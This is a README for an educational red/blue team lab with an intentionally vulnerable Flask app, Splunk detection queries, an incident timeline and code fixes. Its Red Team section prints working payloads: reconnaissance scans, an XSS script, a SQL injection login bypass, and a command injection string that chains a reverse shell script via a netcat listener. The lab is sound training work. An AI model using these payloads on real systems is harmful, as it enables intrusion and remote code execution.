<div align="center">
🔴🔵 Red/Blue Team Security Assessment Lab
<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=22&pause=1000&color=E63946&center=true&vCenter=true&width=600&lines=Educational+Cybersecurity+Training;Red+Team+%7C+Blue+Team+%7C+SIEM;Attack+%E2%86%92+Detect+%E2%86%92+Defend+%E2%86%92+Remediate" alt="Typing Animation" />
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Flask-3.1.5-000000?style=for-the-badge&logo=flask&logoColor=white" />
  <img src="https://img.shields.io/badge/Splunk-9.2.1-000000?style=for-the-badge&logo=splunk&logoColor=white" />
  <img src="https://img.shields.io/badge/Kali%20Linux-2024.4-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/Ubuntu%20Server-24.04%20LTS-E95420?style=for-the-badge&logo=ubuntu&logoColor=white" />
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Status-Completed-brightgreen?style=flat-square" />
  <img src="https://img.shields.io/badge/Purpose-Educational-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" />
  <img src="https://img.shields.io/badge/Year-2026-purple?style=flat-square" />
</p>
</div>
📑 Table of Contents
🎯 Overview
🏗️ Lab Architecture
👥 Team Roles
🎯 Vulnerabilities
🔴 Red Team
🔵 Blue Team
🛡️ Mitigation
📁 Repository Structure
📊 Git History
🛠️ Tech Stack
⚠️ Disclaimer
📚 References
🎯 Overview
<div align="center">
  <img src="https://assets-v2.lottiefiles.com/64f08148cf6170918e10ca3516b8098c1e9e2c8c.gif" width="180" />
</div>
⚠️ Educational Purpose Only — This project contains intentionally vulnerable code for cybersecurity training in a controlled lab environment.
This project simulates a complete real-world attack and defense lifecycle in a controlled lab environment. It was developed as part of the Masar-NCSC (National Cyber Security Center) cybersecurity training program.
The lab consists of three virtual machines simulating a Target, Attacker, and SIEM system. The project covers all phases from building a vulnerable application to attacking it, detecting the attacks, and remediating the vulnerabilities.
🎬 Attack Lifecycle
plain
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   BUILD     │───▶│   ATTACK    │───▶│   DETECT    │───▶│   DEFEND    │
│  (Blue)     │    │   (Red)     │    │  (Blue)     │    │  (Blue)     │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
🏗️ Lab Architecture
<div align="center">
  <img src="https://ik.imagekit.io/1ad02f2e5b98fe6f7b86504a56d23ebfcd1ba2f8.png" width="700" />
</div>
plain
╔══════════════════════════════════════════════════════════════════════════════╗
║                         🔴🔵 RED/BLUE TEAM LAB                               ║
╠═══════════════════════╦═══════════════════════╦════════════════════════════╣
║     🎯 VM1 Target      ║    🦠 VM3 Attacker    ║      📊 VM2 SIEM           ║
║   192.168.255.128      ║   192.168.255.134     ║    192.168.255.133         ║
║                        ║                       ║                            ║
║  ┌─────────────────┐  ║  ┌─────────────────┐  ║  ┌─────────────────────┐   ║
║  │  Kali Linux     │  ║  │  Kali Linux     │  ║  │  Ubuntu Server      │   ║
║  │  Flask Web App  │◀─┼──┤  Nmap/Gobuster  │  ║  │  Splunk 9.2.1       │   ║
║  │  Splunk Fwd     ├──┼──┤  Netcat/curl    │  ║  │  HEC Port 8088      │   ║
║  │  SQLite DB      │  ║  │  Exploit Tools  │  ║  │  Dashboards         │   ║
║  └─────────────────┘  ║  └─────────────────┘  ║  └─────────────────────┘   ║
║         ▲             ║          │            ║            ▲               ║
║         │ Logs        ║          │ Exploit    ║            │ Alerts         ║
║         └─────────────┼──────────┘            ║            │               ║
║                       ║                       ║            │               ║
╚═══════════════════════╩═══════════════════════╩════════════════════════════╝
جدول
VM	Role	IP Address	OS	Key Services
VM1	🎯 Target	192.168.255.128	Kali Linux	Flask App, Splunk UF
VM2	📊 SIEM	192.168.255.133	Ubuntu 24.04	Splunk Enterprise 9.2.1
VM3	🦠 Attacker	192.168.255.134	Kali Linux	Nmap, Gobuster, Netcat
👥 Team Roles
<div align="center">
  <img src="https://meta-wp-uploads.s3.eu-west-1.amazonaws.com/fd29f1d16de13c820b8d50361703200cfc150f37.png" width="600" />
</div>
جدول
Phase	Role	Icon	Responsibilities
Task 1	Architecture & Visibility	🏗️	Build lab, deploy vulnerable app, configure SIEM and log forwarding
Task 2	Offensive Red Team	🔴	Perform black-box penetration test and achieve RCE
Task 3	Defensive Blue Team / IR	🔵	Reconstruct attack timeline, containment, detection queries
Task 4	Mitigation & Re-Exploitation	🛡️	Apply code fixes, re-test exploits, manage Git versioning
🎯 Vulnerabilities
<div align="center">
  <img src="https://cdn.pixabay.com/3bd250119596a0f3f2751359f8d4428d97500469.gif" width="150" />
</div>
جدول
#	Vulnerability	Location	Risk Level	CVSS	Status
1	File Upload	/upload	🔴 Critical	9.8	✅ Patched
2	OS Command Injection	/ping	🔴 Critical	9.8	✅ Patched
3	Cross-Site Scripting (XSS)	/comment	🟠 High	8.1	✅ Patched
4	SQL Injection	/login	🔴 Critical	9.1	✅ Patched
🔴 Red Team — Attack Summary
<div align="center">
  <img src="https://cdnl.iconscout.com/8bf94e1cf9457a18ca8333515803cdee03e077ef.gif" width="200" />
</div>
🔍 Phase 1: Reconnaissance
bash
# 🔎 Port scanning with Nmap
nmap -sV -sC 192.168.255.128 -p- --open

# 📂 Directory enumeration with Gobuster
gobuster dir -u http://192.168.255.128:5000   -w /usr/share/wordlists/dirb/common.txt
💥 Phase 2: Exploitation
🕷️ XSS (Cross-Site Scripting)
HTML
<script>alert('XSS by RedTeam')</script>
💉 SQL Injection (Authentication Bypass)
plain
Username: ' OR 1=1 --
Password: anything
🖥️ Command Injection + Reverse Shell
bash
# 🎧 Listener on attacker VM
nc -lvnp 5555

# 💣 Payload in /ping endpoint
127.0.0.1; python3 /home/kali/vulnerable_app/uploads/shell.py
✅ Result: Full Remote Code Execution (RCE) Achieved!
🔵 Blue Team — Detection & IR
<div align="center">
  <img src="https://www.splunk.com/f4dabaaa35f38f20b9640955f94a2116df1685f5.gif" width="600" />
</div>
🛡️ Splunk Detection Queries
📤 File Upload Detection
spl
index=main sourcetype=flask_app "POST /upload"
| eval attack="🚨 Malicious File Upload Attempt"
| table _time, _raw, attack
| sort -_time
🕷️ XSS Detection
spl
index=main sourcetype=flask_app "POST /comment"
| eval attack="🕷️ XSS Attempt Detected"
| table _time, _raw, attack
| sort -_time
🖥️ Command Injection Detection
spl
index=main sourcetype=flask_app "POST /ping"
| eval attack="💻 Command Injection Attempt"
| table _time, _raw, attack
| sort -_time
💉 SQL Injection Detection
spl
index=main sourcetype=flask_app "POST /login"
| eval attack="💉 SQL Injection Attempt"
| table _time, _raw, attack
| sort -_time
📋 Incident Response Timeline
جدول
Time	Event	Severity
T+0	Nmap scan detected	🟡 Low
T+2m	Gobuster directory enumeration	🟡 Low
T+5m	SQL Injection on /login	🔴 Critical
T+7m	File upload to /upload	🔴 Critical
T+10m	Reverse shell established	🔴 Critical
T+15m	Containment initiated	🟢 Resolved
🛡️ Mitigation — Code Fixes
1️⃣ File Upload Fix
Python
# ✅ Secure File Upload Validation
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Additional: Check MIME type, file size, and store outside web root
2️⃣ Command Injection Fix
Python
import re

# ✅ Input Validation with Whitelist
if re.match(r'^[a-zA-Z0-9.\-]+$', host):
    output = subprocess.getoutput(f'ping -c 1 {host}')
else:
    output = 'Error: Invalid host!'

# Better: Use subprocess with argument list (no shell)
# subprocess.run(['ping', '-c', '1', host], capture_output=True)
3️⃣ XSS Fix
HTML
<!-- ❌ Before (Vulnerable) -->
{{ msg | safe }}

<!-- ✅ After (Fixed) - Auto-escaping enabled -->
{{ msg }}

<!-- Or use |e filter for explicit escaping -->
{{ msg | e }}
4️⃣ SQL Injection Fix
Python
# ❌ Before (Vulnerable - String Concatenation)
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# ✅ After (Fixed - Parameterized Queries)
query = "SELECT * FROM users WHERE username=? AND password=?"
result = conn.execute(query, (username, password)).fetchone()

# Even Better: Use ORM (SQLAlchemy) or prepared statements
📁 Repository Structure
plain
🗂️ red-blue-team-lab/
│
├── 📄 app.py                          ← Main Flask application (patched version)
├── 🗃️ users.db                        ← SQLite database
├── 📂 templates/
│   ├── 🏠 index.html
│   ├── 📤 upload.html
│   ├── 🖥️ ping.html
│   ├── 💬 comment.html
│   └── 🔐 login.html
├── 📂 uploads/                        ← File upload directory (restricted)
├── 📄 requirements.txt                ← Python dependencies
├── 📄 README.md                       ← This file
└── 📂 docs/
    ├── 📊 architecture-diagram.png
    └── 📝 attack-report.pdf
📊 Git History
plain
33e1f7c  🔒 Fix: Patched File Upload, Command Injection, XSS, SQL Injection
         └── Added input validation, parameterized queries, auto-escaping

7cd1ac9  🚀 Initial commit - vulnerable version (baseline)
         └── Intentionally vulnerable Flask app for training
🛠️ Tech Stack
<div align="center">
جدول
Layer	Technology	Version	Badge
Web Framework	Python Flask	3.1.5	<img src="https://img.shields.io/badge/Flask-3.1.5-000000?logo=flask&logoColor=white&style=flat-square" />
Database	SQLite3	3.x	<img src="https://img.shields.io/badge/SQLite-3.x-003B57?logo=sqlite&logoColor=white&style=flat-square" />
SIEM	Splunk Enterprise	9.2.1	<img src="https://img.shields.io/badge/Splunk-9.2.1-000000?logo=splunk&logoColor=white&style=flat-square" />
Log Forwarding	Splunk HEC	—	<img src="https://img.shields.io/badge/HEC-8088-green?style=flat-square" />
Target OS	Kali Linux	2024.4	<img src="https://img.shields.io/badge/Kali-2024.4-557C94?logo=kalilinux&logoColor=white&style=flat-square" />
SIEM OS	Ubuntu Server	24.04 LTS	<img src="https://img.shields.io/badge/Ubuntu-24.04-E95420?logo=ubuntu&logoColor=white&style=flat-square" />
Scanner	Nmap	7.94+	<img src="https://img.shields.io/badge/Nmap-7.94+-blue?style=flat-square" />
Dir Brute	Gobuster	3.6+	<img src="https://img.shields.io/badge/Gobuster-3.6+-orange?style=flat-square" />
</div>
⚠️ Disclaimer
🚨 WARNING: EDUCATIONAL USE ONLY
This project is for educational and training purposes only. The vulnerable code is intentional and designed for cybersecurity training in a controlled lab environment.
❌ DO NOT deploy this application in a production environment.
❌ DO NOT use these techniques on systems you do not own or have explicit permission to test.
✅ Always follow responsible disclosure and ethical hacking principles.
📚 References
جدول
Resource	Link
🛡️ OWASP Top 10	https://owasp.org/www-project-top-ten/
📊 Splunk Documentation	https://docs.splunk.com
🌶️ Flask Documentation	https://flask.palletsprojects.com
🔍 Nmap Documentation	https://nmap.org/docs.html
🏛️ Masar-NCSC Program	National Cyber Security Center
<div align="center">
👤 Author
Abdullah Abughallous
<p align="center">
  <a href="https://github.com/AbdaullahAbughallous">
    <img src="https://img.shields.io/badge/GitHub-AbdaullahAbughallous-181717?logo=github&style=for-the-badge" />
  </a>
</p>
Developed as part of Masar-NCSC Cybersecurity Training Program — 2026
<img src="https://img.shields.io/badge/Made%20with%20%E2%9D%A4%EF%B8%8F%20in-Saudi%20Arabia-green?style=for-the-badge" />
</div>
